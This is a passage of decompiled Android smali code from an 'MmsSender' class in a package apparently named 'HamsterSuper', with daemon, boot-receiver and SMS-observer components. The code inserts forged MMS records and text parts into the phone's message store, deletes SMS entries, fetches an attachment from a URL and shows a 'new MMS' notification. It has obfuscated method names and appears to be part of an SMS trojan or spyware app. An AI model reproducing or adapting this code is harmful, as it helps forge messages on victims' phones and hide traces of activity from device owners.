    invoke-virtual {v0, v1, v2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 188
    const-string v3, "ct"

    const-string v4, "text/plain"

    move-object/from16 v0, v23

    move-object v1, v3

    move-object v2, v4

    invoke-virtual {v0, v1, v2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 190
    const-string v3, "chset"

    const/16 v4, 0x6a

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    move-object/from16 v0, v23

    move-object v1, v3

    move-object v2, v4

    invoke-virtual {v0, v1, v2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 191
    const-string v3, "cid"

    const-string v4, "<text_0>"

    move-object/from16 v0, v23

    move-object v1, v3

    move-object v2, v4

    invoke-virtual {v0, v1, v2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 192
    const-string v3, "cl"

    move-object/from16 v0, v23

    move-object v1, v3

    move-object/from16 v2, v16

    invoke-virtual {v0, v1, v2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 194
    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Service/MmsSender;->mContext:Landroid/content/Context;

    move-object v3, v0

    invoke-virtual {v3}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v3

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "content://mms/"

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object v0, v4

    move-object/from16 v1, v19

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "/part"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v4

    move-object v0, v3

    move-object v1, v4

    move-object/from16 v2, v23

    invoke-virtual {v0, v1, v2}, Landroid/content/ContentResolver;->insert(Landroid/net/Uri;Landroid/content/ContentValues;)Landroid/net/Uri;

    .line 196
    new-instance v6, Ljava/lang/String;

    .end local v6    # "selection":Ljava/lang/String;
    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "mid=\'"

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object v0, v3

    move-object/from16 v1, v19

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "\'"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-direct {v6, v3}, Ljava/lang/String;-><init>(Ljava/lang/String;)V

    .line 197
    .restart local v6    # "selection":Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Service/MmsSender;->mContext:Landroid/content/Context;

    move-object v3, v0

    invoke-virtual {v3}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v3

    const-string v4, "content://mms/part"

    invoke-static {v4}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v4

    const/4 v5, 0x0

    const/4 v7, 0x0

    const-string v8, "_id desc"

    invoke-virtual/range {v3 .. v8}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v13

    .line 199
    invoke-interface {v13}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v3

    if-eqz v3, :cond_4

    .line 201
    const-string v3, "_id"

    invoke-interface {v13, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    invoke-interface {v13, v3}, Landroid/database/Cursor;->getInt(I)I

    move-result v10

    .line 202
    .restart local v10    # "_partID":I
    invoke-static {v10}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v17

    .line 203
    .restart local v17    # "partID":Ljava/lang/String;
    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "content://mms/part/"

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object v0, v3

    move-object/from16 v1, v17

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    move-result-object v18

    .line 205
    .restart local v18    # "partURI":Landroid/net/Uri;
    const/4 v15, 0x0

    .line 208
    .restart local v15    # "is":Ljava/io/OutputStream;
    :try_start_3
    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Service/MmsSender;->mContext:Landroid/content/Context;

    move-object v3, v0

    invoke-virtual {v3}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v3

    move-object v0, v3

    move-object/from16 v1, v18

    invoke-virtual {v0, v1}, Landroid/content/ContentResolver;->openOutputStream(Landroid/net/Uri;)Ljava/io/OutputStream;

    move-result-object v15

    .line 209
    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Service/MmsSender;->text:Ljava/lang/String;

    move-object v3, v0

    invoke-virtual {v3}, Ljava/lang/String;->getBytes()[B

    move-result-object v3

    invoke-virtual {v15, v3}, Ljava/io/OutputStream;->write([B)V

    .line 210
    invoke-virtual {v15}, Ljava/io/OutputStream;->flush()V

    .line 211
    const-string v3, "addr part tet is 0k"

    move-object/from16 v0, p0

    move-object v1, v3

    invoke-direct {v0, v1}, LDaemon/Service/MmsSender;->mf7531e2d(Ljava/lang/String;)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    .line 223
    .end local v6    # "selection":Ljava/lang/String;
    .end local v10    # "_partID":I
    .end local v11    # "annex":[B
    .end local v13    # "cur":Landroid/database/Cursor;
    .end local v15    # "is":Ljava/io/OutputStream;
    .end local v16    # "name":Ljava/lang/String;
    .end local v17    # "partID":Ljava/lang/String;
    .end local v18    # "partURI":Landroid/net/Uri;
    .end local v19    # "pid":Ljava/lang/String;
    .end local v23    # "values":Landroid/content/ContentValues;
    :cond_4
    :goto_2
    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "content://sms/"

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v22

    .line 224
    .local v22, "uri":Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Service/MmsSender;->mContext:Landroid/content/Context;

    move-object v3, v0

    invoke-virtual {v3}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v3

    invoke-static/range {v22 .. v22}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v4

    const/4 v5, 0x0

    const/4 v6, 0x0

    invoke-virtual {v3, v4, v5, v6}, Landroid/content/ContentResolver;->delete(Landroid/net/Uri;Ljava/lang/String;[Ljava/lang/String;)I

    .line 227
    new-instance v3, LDaemon/Service/Notice;

    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Service/MmsSender;->mContext:Landroid/content/Context;

    move-object v4, v0

    const-string v5, "\u65b0\u7684\u5f69\u4fe1"

    const/4 v6, 0x1

    invoke-direct {v3, v4, v5, v6}, LDaemon/Service/Notice;-><init>(Landroid/content/Context;Ljava/lang/String;I)V

    sput-object v3, LHamsterSuper/Client/Deamon/NoticeSms;->notice:LDaemon/Service/Notice;

    .line 228
    sget-object v3, LHamsterSuper/Client/Deamon/NoticeSms;->notice:LDaemon/Service/Notice;

    const-string v4, ""

    invoke-virtual {v3, v4}, LDaemon/Service/Notice;->setfilename(Ljava/lang/String;)V

    .line 229
    sget-object v3, LHamsterSuper/Client/Deamon/NoticeSms;->notice:LDaemon/Service/Notice;

    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Service/MmsSender;->sub:Ljava/lang/String;

    move-object v4, v0

    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Service/MmsSender;->text:Ljava/lang/String;

    move-object v5, v0

    invoke-virtual {v3, v4, v5}, LDaemon/Service/Notice;->Update(Ljava/lang/String;Ljava/lang/String;)V

    .line 232
    return-void

    .line 159
    .end local v22    # "uri":Ljava/lang/String;
    .restart local v11    # "annex":[B
    .restart local v19    # "pid":Ljava/lang/String;
    .restart local v23    # "values":Landroid/content/ContentValues;
    :cond_5
    :try_start_4
    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Service/MmsSender;->Annex_url:Ljava/lang/String;

    move-object v3, v0

    invoke-static {v3}, LDaemon/DownLoad/FileUtils;->mdcc6a58d(Ljava/lang/String;)[B

    move-result-object v11

    goto/16 :goto_0

    .line 178
    .restart local v6    # "selection":Ljava/lang/String;
    .restart local v10    # "_partID":I
    .restart local v13    # "cur":Landroid/database/Cursor;
    .restart local v15    # "is":Ljava/io/OutputStream;
    .restart local v17    # "partID":Ljava/lang/String;
    .restart local v18    # "partURI":Landroid/net/Uri;
    :catch_0
    move-exception v3

    move-object v14, v3

    .line 179
    .local v14, "e":Ljava/lang/Exception;
    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "saveDataToFile 1:"

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v14}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    move-object/from16 v0, p0

    move-object v1, v3

    invoke-direct {v0, v1}, LDaemon/Service/MmsSender;->mf7531e2d(Ljava/lang/String;)V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1

    goto/16 :goto_1

    .line 219
    .end local v6    # "selection":Ljava/lang/String;
    .end local v10    # "_partID":I
    .end local v11    # "annex":[B
    .end local v13    # "cur":Landroid/database/Cursor;
    .end local v14    # "e":Ljava/lang/Exception;
    .end local v15    # "is":Ljava/io/OutputStream;
    .end local v17    # "partID":Ljava/lang/String;
    .end local v18    # "partURI":Landroid/net/Uri;
    .end local v19    # "pid":Ljava/lang/String;
    .end local v23    # "values":Landroid/content/ContentValues;
    :catch_1
    move-exception v3

    move-object v14, v3

    .line 220
    .restart local v14    # "e":Ljava/lang/Exception;
    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "mmsSender:"

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v14}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    move-object/from16 v0, p0

    move-object v1, v3

    invoke-direct {v0, v1}, LDaemon/Service/MmsSender;->mf7531e2d(Ljava/lang/String;)V

    goto/16 :goto_2

    .line 212
    .end local v14    # "e":Ljava/lang/Exception;
    .restart local v6    # "selection":Ljava/lang/String;
    .restart local v10    # "_partID":I
    .restart local v11    # "annex":[B
    .restart local v13    # "cur":Landroid/database/Cursor;
    .restart local v15    # "is":Ljava/io/OutputStream;
    .restart local v16    # "name":Ljava/lang/String;
    .restart local v17    # "partID":Ljava/lang/String;
    .restart local v18    # "partURI":Landroid/net/Uri;
    .restart local v19    # "pid":Ljava/lang/String;
    .restart local v23    # "values":Landroid/content/ContentValues;
    :catch_2
    move-exception v3

    move-object v14, v3

    .line 213
    .restart local v14    # "e":Ljava/lang/Exception;
    :try_start_5
    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "saveDataToFile 2:"

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v14}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    move-object/from16 v0, p0

    move-object v1, v3

    invoke-direct {v0, v1}, LDaemon/Service/MmsSender;->mf7531e2d(Ljava/lang/String;)V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_1

    goto/16 :goto_2
.end method

.method public setThread()V
    .locals 3

    .prologue
    .line 66
    const/4 v0, 0x2

    iput v0, p0, LDaemon/Service/MmsSender;->sendmode:I

    .line 67
    sget-object v0, LHamsterSuper/Client/Deamon/BootReceiver;->smsobserver:LDaemon/Service/SMSObserver;

    iget-object v1, p0, LDaemon/Service/MmsSender;->number:Ljava/lang/String;

    const-string v2, "send mms thread"

    invoke-virtual {v0, v1, v2}, LDaemon/Service/SMSObserver;->getSms(Ljava/lang/String;Ljava/lang/String;)V

    .line 69
    return-void
.end method
